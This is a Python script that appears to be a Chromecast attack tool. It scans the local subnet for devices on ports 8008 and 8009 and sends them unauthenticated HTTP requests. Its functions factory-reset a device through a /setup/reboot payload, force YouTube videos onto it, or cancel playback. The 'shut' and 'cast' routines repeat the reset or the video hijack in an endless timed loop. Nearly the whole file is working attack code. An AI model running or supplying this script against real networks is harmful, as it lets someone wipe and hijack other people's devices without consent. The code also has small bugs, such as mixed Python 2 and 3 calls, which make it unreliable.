import socket
from netifaces import ifaddresses, interfaces
from sys import exit, argv
from os import system, name
from multiprocessing.pool import ThreadPool
from requests import post, delete, get
from json import dumps
from time import sleep


def get_ips(gui=False):
    """ Getting a list of ips obtained by all network interfaces """
    lips = []
    for i in interfaces():
        try:
            if gui:
                if name == 'nt':
                    lips.append(' , ' + ifaddresses(i)[2][0].get('addr'))
                else:
                    lips.append(i + ' , ' + ifaddresses(i)[2][0].get('addr'))
            else:
                lips.append(ifaddresses(i)[2][0].get('addr'))
        except:
            pass
    if len(lips) >= 1:
        return lips
    return None


def ch_ip(lip='127.0.0.1', gui=False):
    """ returning a ready to be used ip with user chosing """
    c = 0
    slist = []
    if get_ips() is None:
        print('Error: no networks connected were found')
        exit(0)
    if gui:
        if lip in get_ips():
            slist.append(lip)
        else:
            print('Error: inserted local ip does not exist')
            return None
    else:
        for ips in get_ips():
            c += 1
            print("type [ %i ] for : %s " % (c, ips))
            slist.append([c, ips])
        inp = input('# please , select one :> ')
    for f in slist:
        if int(f[0]) == int(inp):
            cip = str(f[1])
            ncip = cip.split('.')
            ncip[len(ncip) - 1] = '1'
            cip = '.'.join(ncip)
            return cip
    return None


def det_ccast(ip):
    """ to detect chrome cast with its known ports and return its ip """
    ports = [8008, 8009]  # known ports
    results = []  # in-which socket response will be stored to check later
    for p in ports:
        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        cip = str(ip)
        ncip = cip.split('.')
        ncip[len(ncip) - 1] = ''
        cip = '.'.join(ncip)
        for i in get_ips():
            if cip in i:
                cip = i
        socket.setdefaulttimeout(4)
        try:
            socket_obj.bind((cip, 0))
            result = socket_obj.connect_ex((ip, p))
            results.append(result)
        except:
            pass
        socket_obj.close()
    if 0 in results:
        return [True, ip]
    else:
        return [False, ip]


def loop_ips(oip, vbos=False, quite=False, thds=30):
    """ looping through the ips from ch_ip till 255 and detect using
    det_ccast and returning a list of potential chromecasts """
    ccast_l = []  # chrome cast ips list
    threads = []  # list of appended threads to check their results
    pool = ThreadPool(
        processes=thds)  # threads pool with number of expected threads
    if not quite:
        print("*" * 4, " Started threading scan ", "*" * 5)
    for np in range(1, 255):
        noip = oip.split('.')
        noip[len(noip) - 1] = str(np)
        fip = '.'.join(noip)
        if vbos:
            print(' %%% Threading and scanning ' + fip + " currently ..")
        thr = pool.apply_async(det_ccast, (fip,))
        threads.append(thr)
    pool.close()
    pool.join()  # joining the thread pool results
    if not quite:
        print("#" * 5, " Fininshed threading scan ", "#" * 5)
        print("*" * 5, " Checking scan results ", "*" * 5)
    for th in threads:
        if vbos:
            print(' %%% Checking thread results of ' + th.get()[1])
        if th.get()[0]:
            ccast_l.append(th.get()[1])
    if not quite:
        print("#" * 3, " Finished checking results ", "*" * 3)
    if len(ccast_l) >= 1:
        return ccast_l
    return None


def reset_cc(fip):
    """ sending jason request to chrome cast to system restore """
    pl = {"params": "fdr"}  # jason payload to system reset
    hd = {'Content-type': 'application/json'}  # the post request header
    portss = ['8008', '8009']
    for p in portss:
        try:
            link = "http://" + fip + ":" + p + "/setup/reboot"  # link of CC
            rq = post(link, data=dumps(pl), headers=hd)
            return True
        except:
            pass
    return False


def cancel_app(fip):
    """ canceling whatever been played on chrome cast """
    hd = {'Content-type': 'application/json'}  # the delete request header
    portss = ['8008', '8009']
    for p in portss:
        try:
            link = "http://" + fip + ":" + p + "/apps/YouTube"
            rq = delete(link, headers=hd)
            return True
        except:
            pass
    return None


def send_app(fip, ylink="v=04F4xlWSFh0&t=9"):
    """ sending a video to chrome cast """
    hd = {'Content-type': 'application/json'}  # the post request header
    pl = ylink  # video link
    portss = ['8008', '8009']
    for p in portss:
        try:
            link = "http://" + fip + ":" + p + "/apps/YouTube"
            rq = post(link, data=pl, headers=hd)
            return True
        except:
            pass
    return False


def get_app(fip):
    """ sending a video to chrome cast """
    hd = {'Content-type': 'application/json'}  # the post request header
    portss = ['8008', '8009']
    for p in portss:
        try:
            link = "http://" + fip + ":" + p + "/apps/YouTube"
            rq = get(link, headers=hd)
            return [True, rq]
        except:
            pass
    return [False, False]


def cast(dip=False, vid=False, counter=0):
    dr = raw_input(" >>> please, insert repeating duration in seconds : ")
    dr = int(dr)
    if dr > 100000:
        print("Error: too large of a duration ...")
        exit(0)
    if dr < 1:
        print("Error: too small of a duration ...")
        exit(0)
    while True:
        if det_ccast(dip)[0]:
            if vid:
                send_app(dip, vid)
            else:
                send_app(dip)
            print("threading and found it again ")
            counter = int(counter)
            counter += 1
        counter = str(counter)
        imsg = "@" * 4
        imsg += " looping throug : " + counter
        imsg += " chrome cast detected and streamed to .."
        print(imsg)
        print("#" * 5, " Ctrl-c to exit .. ")
        sleep(dr)


def shut(dip=False, auto=True):
    dr = raw_input(" >>> please, insert repeating duration in seconds : ")
    dr = int(dr)
    if dr > 100000:
        print("Error: too large of a duration ...")
        exit(0)
    if dr < 1:
        print("Error: too small of a duration ...")
        exit(0)

    def loop_s(dfip, dr=dr, counter=0):
        while True:
            if det_ccast(dfip)[0]:
                reset_cc(dfip)
                print("threading and found it again ")
                counter = int(counter)
                counter += 1
            counter = str(counter)
            imsg = "@" * 4
            imsg += " looping throug : " + counter
            imsg += " chrome cast detected and factory reseted .."
            print(imsg)
            print("#" * 5, " Ctrl-c to exit .. ")
            sleep(dr)

    if type(dip) == str and not auto:
        loop_s(dip)
    else:
        rip = ch_ip()
        print("%" * 3, " scanning ips ..")
        lips = loop_ips(rip, vbos=False, quite=True)
        if lips is None:
            print("Error: no chrome casts were found ..")
            exit(0)
        else:
            loop_s(lips[0])
